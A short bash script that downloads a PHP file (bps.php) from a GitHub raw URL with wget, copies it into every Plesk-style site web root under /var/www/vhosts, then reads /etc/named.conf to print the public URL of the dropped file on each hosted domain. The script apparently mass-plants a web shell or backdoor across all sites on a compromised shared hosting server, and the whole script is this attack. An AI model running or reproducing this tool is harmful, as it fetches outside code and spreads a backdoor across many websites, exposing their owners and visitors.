#!/bin/bash

# Prompt user to enter the filename
read -p "Enter the filename for the PHP file (e.g., bps.php): " file_to_upload

# Download file
if wget "https://raw.githubusercontent.com/chuckyreply/xTRI_D/main/bps.php" -O "$file_to_upload"; then
    echo "File downloaded successfully as $file_to_upload"
else
    echo "Failed to download file"
    exit 1
fi

# Iterate through user directories in /var/www/vhosts/*/httpdocs and upload file
for user_dir in /var/www/vhosts/*/httpdocs; do
    if [ -d "$user_dir" ]; then
        # Upload file to user directory
        if cp "$file_to_upload" "$user_dir/"; then
            echo "File uploaded to $user_dir/"
        else
            echo "Failed to upload file to $user_dir/"
        fi
    else
        echo "$user_dir is not a directory"
    fi
done

# View contents of /etc/named.conf
echo "Contents of /etc/named.conf:"
if [ -f /etc/named.conf ]; then
    while IFS= read -r line; do
        # Check if line contains /var/named/*.db
        if [[ "$line" =~ /var/named/([^\/]+)\.db ]]; then
            domain="${BASH_REMATCH[1]}"
            echo "https://$domain/$file_to_upload"
        fi
    done < /etc/named.conf
else
    echo "/etc/named.conf does not exist"
fi
